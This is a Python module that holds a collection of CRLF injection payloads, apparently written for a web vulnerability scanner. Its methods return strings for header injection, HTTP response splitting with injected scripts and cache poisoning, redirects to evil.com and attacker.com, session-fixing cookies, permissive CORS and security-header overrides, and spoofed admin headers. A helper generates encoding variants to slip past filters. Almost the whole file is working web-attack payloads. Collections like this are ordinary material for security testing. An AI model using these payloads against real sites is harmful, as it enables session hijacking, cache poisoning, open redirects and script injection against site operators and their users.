"""
CRLF (Carriage Return Line Feed) injection payload collection
"""

from typing import List, Dict, Any

class CRLFPayloads:
    """CRLF injection payload collection"""
    
    @staticmethod
    def get_basic_payloads() -> List[str]:
        """Get basic CRLF injection payloads"""
        return [
            # Basic CRLF sequences
            '\r\nX-Injected-Header: test',
            '\nX-Injected-Header: test',
            '\rX-Injected-Header: test',
            
            # URL encoded CRLF
            '%0d%0aX-Injected-Header: test',
            '%0aX-Injected-Header: test',
            '%0dX-Injected-Header: test',
            
            # Double URL encoded
            '%250d%250aX-Injected-Header: test',
            '%250aX-Injected-Header: test',
            
            # Unicode encoded
            '%u000d%u000aX-Injected-Header: test',
            '%u000aX-Injected-Header: test',
            
            # Mixed encoding
            '\r%0aX-Injected-Header: test',
            '%0d\nX-Injected-Header: test',
            
            # Set-Cookie injection
            '\r\nSet-Cookie: injected=test',
            '%0d%0aSet-Cookie: injected=test',
            
            # Location header injection
            '\r\nLocation: http://evil.com',
            '%0d%0aLocation: http://evil.com'
        ]
    
    @staticmethod
    def get_response_splitting_payloads() -> List[str]:
        """Get HTTP response splitting payloads"""
        return [
            # Basic response splitting
            '\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert("XSS")</script>',
            '%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert("XSS")</script>',
            
            # Response splitting with cache poisoning
            '\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\nContent-Type: text/html\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert("Cached")</script>',
            
            # Response splitting with redirect
            '\r\n\r\nHTTP/1.1 302 Found\r\nLocation: http://evil.com\r\n\r\n',
            '%0d%0a%0d%0aHTTP/1.1 302 Found%0d%0aLocation: http://evil.com%0d%0a%0d%0a',
            
            # Response splitting with cookie injection
            '\r\n\r\nHTTP/1.1 200 OK\r\nSet-Cookie: admin=true\r\nContent-Type: text/html\r\n\r\n<h1>Admin Panel</h1>',
            
            # Response splitting with content injection
            '\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 50\r\n\r\n<html><body><h1>Injected Content</h1></body></html>'
        ]
    
    @staticmethod
    def get_header_injection_payloads() -> List[str]:
        """Get header injection payloads"""
        return [
            # Custom header injection
            '\r\nX-CRLF-Test: injected',
            '%0d%0aX-CRLF-Test: injected',
            '\nX-CRLF-Test: injected',
            
            # Security header bypass
            '\r\nX-Frame-Options: ALLOWALL',
            '%0d%0aX-Frame-Options: ALLOWALL',
            '\r\nContent-Security-Policy: default-src *',
            
            # Cache control manipulation
            '\r\nCache-Control: no-cache',
            '%0d%0aCache-Control: public, max-age=31536000',
            '\r\nExpires: Thu, 01 Jan 1970 00:00:00 GMT',
            
            # Content type manipulation
            '\r\nContent-Type: text/html',
            '%0d%0aContent-Type: application/javascript',
            '\r\nContent-Type: text/plain',
            
            # CORS header injection
            '\r\nAccess-Control-Allow-Origin: *',
            '%0d%0aAccess-Control-Allow-Origin: http://evil.com',
            '\r\nAccess-Control-Allow-Credentials: true',
            
            # Authentication bypass attempts
            '\r\nAuthorization: Bearer admin_token',
            '%0d%0aX-User-Role: admin',
            '\r\nX-Forwarded-User: admin'
        ]
    
    @staticmethod
    def get_redirect_payloads() -> List[str]:
        """Get redirect-based CRLF payloads"""
        return [
            # Basic redirect injection
            '\r\nLocation: http://evil.com',
            '%0d%0aLocation: http://evil.com',
            '\nLocation: http://evil.com',
            
            # JavaScript redirect
            '\r\nLocation: javascript:alert("XSS")',
            '%0d%0aLocation: javascript:alert("XSS")',
            
            # Data URI redirect
            '\r\nLocation: data:text/html,<script>alert("XSS")</script>',
            '%0d%0aLocation: data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
            
            # Protocol-relative redirect
            '\r\nLocation: //evil.com',
            '%0d%0aLocation: //evil.com',
            
            # Refresh header injection
            '\r\nRefresh: 0;url=http://evil.com',
            '%0d%0aRefresh: 0;url=http://evil.com',
            
            # Multiple redirects
            '\r\nLocation: http://evil.com\r\nLocation: http://attacker.com',
            '%0d%0aLocation: http://evil.com%0d%0aLocation: http://attacker.com'
        ]
    
    @staticmethod
    def get_cookie_injection_payloads() -> List[str]:
        """Get cookie injection payloads"""
        return [
            # Basic cookie injection
            '\r\nSet-Cookie: injected=test',
            '%0d%0aSet-Cookie: injected=test',
            '\nSet-Cookie: injected=test',
            
            # Session hijacking
            '\r\nSet-Cookie: PHPSESSID=admin_session',
            '%0d%0aSet-Cookie: JSESSIONID=admin_session',
            '\r\nSet-Cookie: session_id=hijacked',
            
            # Persistent cookies
            '\r\nSet-Cookie: persistent=test; Expires=Wed, 09 Jun 2025 10:18:14 GMT',
            '%0d%0aSet-Cookie: persistent=test; Max-Age=31536000',
            
            # HttpOnly bypass attempt
            '\r\nSet-Cookie: test=value; HttpOnly=false',
            '%0d%0aSet-Cookie: test=value; HttpOnly',
            
            # Secure flag manipulation
            '\r\nSet-Cookie: test=value; Secure=false',
            '%0d%0aSet-Cookie: test=value; Secure',
            
            # SameSite bypass
            '\r\nSet-Cookie: test=value; SameSite=None',
            '%0d%0aSet-Cookie: test=value; SameSite=Lax',
            
            # Multiple cookie injection
            '\r\nSet-Cookie: cookie1=value1\r\nSet-Cookie: cookie2=value2',
            '%0d%0aSet-Cookie: cookie1=value1%0d%0aSet-Cookie: cookie2=value2'
        ]
    
    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all CRLF injection payloads"""
        payloads = []
        payloads.extend(CRLFPayloads.get_basic_payloads())
        payloads.extend(CRLFPayloads.get_header_injection_payloads())
        payloads.extend(CRLFPayloads.get_redirect_payloads())
        payloads.extend(CRLFPayloads.get_cookie_injection_payloads())
        payloads.extend(CRLFPayloads.get_response_splitting_payloads()[:5])  # Limit response splitting
        return payloads
    
    @staticmethod
    def get_encoding_variations(payload: str) -> List[str]:
        """Get different encoding variations of a payload"""
        variations = [payload]
        
        # URL encoding
        url_encoded = payload.replace('\r', '%0d').replace('\n', '%0a')
        variations.append(url_encoded)
        
        # Double URL encoding
        double_encoded = url_encoded.replace('%', '%25')
        variations.append(double_encoded)
        
        # Unicode encoding
        unicode_encoded = payload.replace('\r', '%u000d').replace('\n', '%u000a')
        variations.append(unicode_encoded)
        
        # Mixed encoding
        mixed1 = payload.replace('\r\n', '\r%0a')
        mixed2 = payload.replace('\r\n', '%0d\n')
        variations.extend([mixed1, mixed2])
        
        return list(set(variations))  # Remove duplicates
